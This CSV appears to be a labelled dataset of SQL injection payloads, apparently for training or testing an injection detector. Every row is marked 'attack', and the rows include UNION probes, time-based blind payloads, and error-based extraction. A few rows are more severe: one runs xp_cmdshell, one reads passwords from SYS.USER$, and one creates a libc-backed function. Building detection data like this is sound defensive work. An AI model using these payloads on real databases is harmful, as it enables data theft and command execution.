sentence,attack_type_code,attack_type,len_payload
""" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND ""vItm"" LIKE ""vItm",1,attack,112
"""  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( ""dvhW"" LIKE ""dvhW",1,attack,327
"-7531'  )  )   )  union all select 6900,6900,6900,6900,6900,6900,6900,6900,6900#",1,attack,80
1'+ ( select 'mjgo' where 4026 = 4026,1,attack,37
"-9122 )  as sdlg where 1546 = 1546 union all select 1546,1546,1546,1546,1546,1546,1546--",1,attack,88
1'  )  )   as fbjd where 8597 = 8597,1,attack,36
1'  )  )   as dago where 9788 = 9788,1,attack,36
' or 'something'  =  'some'+'thing',1,attack,35
"1%' or elt ( 6272 = 6272,sleep ( 5  )  )   and '%' = '",1,attack,54
; BEGIN DBMS_LOCK.SLEEP ( 5 ) ; END;--,1,attack,38
"' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND 'xywK' = 'xywK",1,attack,296
",0x28 )  AND   (  (   ( ""jQNw"" = ""jQNw",1,attack,38
"1' )  and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and  ( 'rvwk' = 'rvwk",1,attack,289
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'qsGt' LIKE 'qsGt",1,attack,357
"""  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( ""Dwth"" = ""Dwth",1,attack,246
"-8279"" union all select 6598,6598,6598,6598,6598,6598,6598,6598#",1,attack,64
"1 )  where 5336 = 5336 union all select null,null,null,null,null,null,null,null,null,null#",1,attack,90
 )  AND SLEEP ( 5 ) --  AND  ( 9080 = 9080,1,attack,41
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'zEzg' = 'zEzg",1,attack,108
"1 and make_set ( 8403 = 8403,8899 ) -- rbxf",1,attack,43
"' )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( 'ZymQ' LIKE 'ZymQ",1,attack,340
"1%"" or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and ""%"" = """,1,attack,70
"  )  )   ) ; IF  (  (  2540 = 2540 ) ,SELECT 2540,DROP FUNCTION UJSP ) ;--  AND   (  (   ( 4365 = 4365",1,attack,100
"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23",1,attack,47
"1 where 6369 = 6369 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 ) --",1,attack,139
"'  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (  'ErGC' = 'ErGC",1,attack,294
""" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND ""UDTt"" LIKE ""UDTt",1,attack,286
' ) ; WAITFOR DELAY '0:0:5';--,1,attack,30
1' )  where 3636 = 3636 or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --,1,attack,76
-8080'  )  )   order by 1#,1,attack,26
1'|| ( select 'wadx' where 4287 = 4287 or sleep ( 5 ) #,1,attack,55
""" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND ""PUZz"" = ""PUZz",1,attack,97
"1 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 ) # fzni",1,attack,122
""" ) ,NULL,NULL,NULL,NULL,NULL )  waitfor delay '0:0:20' /*",1,attack,58
"1'  )  )   )  and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,attack,176
""" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND ""Mkhm"" LIKE ""Mkhm",1,attack,310
"' UNION ALL SELECT NULL, NULL# AND 'jioc' = 'jioc",1,attack,49
-6792  )  )   as zlho where 4758 = 4758 or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 11,1,attack,255
 )  AND 9217 = UTL_INADDR.GET_HOST_ADDRESS ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 9217 = 9217 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58  )  )   AND  ( 7629 = 7629,1,attack,277
"1"" )  and elt ( 3114 = 3114,sleep ( 5  )  )  #",1,attack,46
 end and   (  (   ( 'gqhc' = 'gqhc,1,attack,33
" ) , ( select if ( count ( * ) ! = -1,benchmark ( 3000000,MD5 ( 1  )  )  ,benchmark ( 3000000,MD5 ( 1  )  )    )  )  --",1,attack,118
-1354  )  )   or 8571 = 8571--,1,attack,30
""" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND  ( ""vvhm"" = ""vvhm",1,attack,284
"""  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( ""WSyI"" = ""WSyI",1,attack,204
"-5969"" where 9248 = 9248 or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118",1,attack,255
"  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (  7985 = 7985",1,attack,258
" select * from users where id = 1 or 1#"". = 1 union select 1,version (  )  -- 1",1,attack,78
'  )  )  ; IF ( 3509 = 3509 )  SELECT 3509 ELSE DROP FUNCTION mjwI;--,1,attack,69
""" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( ""qpuA"" = ""qpuA",1,attack,295
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 7136 = 7136",1,attack,173
"-8600"" or elt ( 1032 = 1032,3623 )  and ""kfsn"" like ""kfsn",1,attack,57
"' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND 'mWDL' = 'mWDL",1,attack,314
&1c: select * from users where id = 1   or 1 = 1 -- 1,1,attack,53
1' )  where 3311 = 3311,1,attack,23
"1""  )  )   as oiqr where 4073 = 4073 or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,attack,112
1 )  where 5651 = 5651,1,attack,22
-2960' or 2163 = 3143--,1,attack,23
" UNION ALL SELECT @@VERSION,USER (  ) ,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",1,attack,125
"' )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( 'Phbf' LIKE 'Phbf",1,attack,124
"1'  )  )   and elt ( 4249 = 4249,7259 )  and   (  (  'oucg' = 'oucg",1,attack,67
1'|| ( select 'boxx' where 2038 = 2038 and 9198 = 9198--,1,attack,56
"' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#",1,attack,150
"-7125"" or  ( 8919 = 2275 ) *2275 and ""fbwo"" = ""fbwo",1,attack,51
"1%"" and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and ""%"" = """,1,attack,122
"1%""  )  )   waitfor delay '0:0:5'--",1,attack,35
"admin"" )  or  ( ""1"" = ""1""/*",1,attack,27
select  ( case when  ( 5390 = 7419 )  then 5390 else 5390* ( select 5390 from mysql.db )  end ) #,1,attack,97
"""  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (  ""kwca"" = ""kwca",1,attack,354
"1%""  )  )   )  and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and   (  (   ( ""%"" = """,1,attack,93
""" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND  ( ""DFWG"" LIKE ""DFWG",1,attack,317
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'lGXF' LIKE 'lGXF",1,attack,315
"  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (  8040 = 8040",1,attack,281
"' )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( 'TdSU' LIKE 'TdSU",1,attack,286
" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND  ( 9285 = 9285",1,attack,327
"1'|| ( select 'ybfo' from dual where 3319 = 3319 union all select null,null,null,null,null,null,null,null#",1,attack,106
"1"" or sleep ( 5 )  and ""telb"" = ""telb",1,attack,37
",NULL,NULL,NULL,NULL )  waitfor delay '0:0:20' /*",1,attack,49
1%' and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and '%' = ',1,attack,67
  )  )   )  UNION ALL SELECT NULL-- AND   (  (   ( 5602 = 5602,1,attack,60
"-1963 union all select 6831,6831,6831,6831,6831,6831,6831,6831#",1,attack,63
1  )  )   as epfz where 5471 = 5471,1,attack,35
"-6292 )  union all select 7499,7499,7499,7499,7499,7499,7499--",1,attack,62
"' )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND  ( 'qGTJ' LIKE 'qGTJ",1,attack,197
"' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND 'wKxf' LIKE 'wKxf",1,attack,287
'; exec master..xp_cmdshell 'ping 172.10.1.255'--,1,attack,49
"  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (  6913 = 6913",1,attack,120
"1' )  as ljpy where 8270 = 8270 or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) --",1,attack,245
"1""  )  )   union all select null,null,null,null,null,null,null,null--",1,attack,69
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'zjhD' = 'zjhD",1,attack,294
" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( 9300 = 9300",1,attack,338
"1"" )  union all select null,null#",1,attack,33
1'|| ( select 'uedk' where 4655 = 4655,1,attack,38
"1'  )  )   as lmsl where 3753 = 3753 or elt ( 5873 = 5873,sleep ( 5  )  )  #",1,attack,76
"-5830 )  or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ",1,attack,254
"-3278'  )  )   or elt ( 1032 = 1032,3623 )  and   (  (  'zxig' like 'zxig",1,attack,73
"' ) ; CREATE OR REPLACE FUNCTION SLEEP ( int )  RETURNS int AS '/lib/libc.so.6','sleep' language 'C' STRICT; SELECT sleep ( 5 ) ;--",1,attack,131
1'  )  )   )  or sleep ( 5 )  and   (  (   ( 'bmnf' like 'bmnf,1,attack,62
 AND 9263 =  ( SELECT 9263 FROM PG_SLEEP ( 5  )  )  ,1,attack,49
"'  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (  'LBvY' LIKE 'LBvY",1,attack,291
"1' )  or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) ",1,attack,164
" AND 2947 = LIKE ( 'ABCDEFG',UPPER ( HEX ( RANDOMBLOB ( 1000000000/2  )  )    )  )  ",1,attack,81
 ORDER BY 31337-- ,1,attack,16
" select * from users where id = 1 or "",."" or 1 = 1 -- 1",1,attack,54
'  )  )   AND 2571 = 5533-- AND   (  (  'ZeAw' = 'ZeAw,1,attack,54
"'  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (  'iyIU' = 'iyIU",1,attack,101
"1%' union all select null,null,null,null,null,null,null,null,null,null--",1,attack,72
1' where 6003 = 6003 rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )  --,1,attack,98
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 4448 = 4448",1,attack,240
"-4223'  )  )   )  union all select 7913,7913,7913,7913,7913,7913,7913,7913,7913,7913#",1,attack,85
'; BEGIN USER_LOCK.SLEEP ( 5 ) ; END;--,1,attack,39
"-2460%"" )  or  ( 2660 = 5767 ) *5767 and  ( ""%"" = """,1,attack,51
"'  )  )  ; CREATE OR REPLACE FUNCTION SLEEP ( int )  RETURNS int AS '/lib/libc.so.6','sleep' language 'C' STRICT; SELECT sleep ( 5 ) ;-- AND   (  (  'Ddhw' = 'Ddhw",1,attack,163
waitfor delay '0:0:5' ) +',1,attack,26
"1""  )  )   )  and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,attack,90
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'ubpN' LIKE 'ubpN",1,attack,158
"'  )  )   )  AND 942 = CONVERT ( INT, ( CHAR ( 58 ) +CHAR ( 99 ) +CHAR ( 108 ) +CHAR ( 122 ) +CHAR ( 58 ) + ( SELECT  ( CASE WHEN  ( 942 = 942 )  THEN CHAR ( 49 )  ELSE CHAR ( 48 )  END  )  )  +CHAR ( 58 ) +CHAR ( 120 ) +CHAR ( 105 ) +CHAR ( 100 ) +CHAR ( 58  )  )   )  AND   (  (   ( 'hZcS' LIKE 'hZcS",1,attack,302
(sqlattempt2),1,attack,13
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 4347 = 4347",1,attack,324
"""  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( ""pixM"" LIKE ""pixM",1,attack,297
"1""  )  )   )  or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and   (  (   ( ""zzcd"" = ""zzcd",1,attack,153
"1%'  )  )   and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,attack,109
select sleep ( 5 ) #,1,attack,20
" select * from users where id = '1' union select \,@@VERSION -- 1'",1,attack,65
"1""  )  )   )  or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and   (  (   ( ""epfg"" like ""epfg",1,attack,106
"1"" and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ",1,attack,186
1 order by 1--,1,attack,14
""" AND 4605 =  ( SELECT UPPER ( XMLType ( CHR ( 60 ) ||CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 4605 = 4605 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58 ) ||CHR ( 62  )  )   )  FROM DUAL )  AND ""KlNO"" LIKE ""KlNO",1,attack,319
" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))-- ",1,attack,50
 or 2 > 1,1,attack,8
"-7416"" where 7656 = 7656 order by 1--",1,attack,37
"1 where 1992 = 1992 union all select null,null--",1,attack,48
"hi or 1 = 1 --""",1,attack,15
"' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND 'tjhf' LIKE 'tjhf",1,attack,208
" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND  ( 1471 = 1471",1,attack,303
"1"" )  where 8657 = 8657",1,attack,23
1'|| ( select 'tjzy' where 3037 = 3037,1,attack,38
"+if ( benchmark ( 3000000,MD5 ( 1  )  )  ,NULL,NULL ) ,NULL,NULL,NULL,NULL )  %23",1,attack,81
-9840'  )  )   or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr (,1,attack,255
"1' )  or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) ",1,attack,205
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",1,attack,184
"1"" )  or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and  ( ""bvdv"" like ""bvdv",1,attack,145
" )  AND  ( SELECT 8121 FROM ( SELECT COUNT ( * ) ,CONCAT ( CHAR ( 58,99,108,122,58 ) , ( SELECT  ( CASE WHEN  ( 8121 = 8121 )  THEN 1 ELSE 0 END  )  )  ,CHAR ( 58,120,105,100,58 ) ,FLOOR ( RAND ( 0 ) *2  )  )  x FROM information_schema.tables GROUP BY x ) a ) ",1,attack,258
1' )  as zdhq where 5586 = 5586,1,attack,31
"UE11f: select * from users where id = 1 union select 1 $,version (  )  -- 1",1,attack,75
" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#",1,attack,208
 end and  ( 9416 = 9416,1,attack,22
1 and  ( 5369 = 8325 ) *8325# psze,1,attack,34
"-5362 )  union all select 7297,7297,7297,7297,7297#",1,attack,51
-9225 )  or  ( 8258 = 2726 ) *2726 and  ( 9900 = 9900,1,attack,53
1' )  where 4298 = 4298,1,attack,23
